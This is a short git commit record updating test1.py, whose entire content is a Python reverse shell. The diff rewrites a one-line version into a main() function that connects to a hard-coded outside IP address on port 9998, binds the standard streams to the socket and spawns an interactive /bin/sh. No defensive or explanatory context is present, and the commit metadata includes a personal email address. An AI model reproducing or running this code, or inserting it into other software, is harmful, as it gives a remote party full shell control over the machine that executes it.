a1390be118ec180805834e247af0058595bf3cac
dddsjz <junzhe.sun13@gmail.com>
2020-11-20 09:33:57 +0800

    Update test1.py

--- test1.py
+++ test1.py
@@ -1,1 +1,12 @@
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("167.179.96.180",9998));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+import socket,subprocess,os
+
+def main():
+  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+  s.connect(("167.179.96.180",9998))
+  os.dup2(s.fileno(),0)
+  os.dup2(s.fileno(),1)
+  os.dup2(s.fileno(),2)
+  p=subprocess.call(["/bin/sh","-i"])
+  
+if __name__ == '__main__':
+  main()
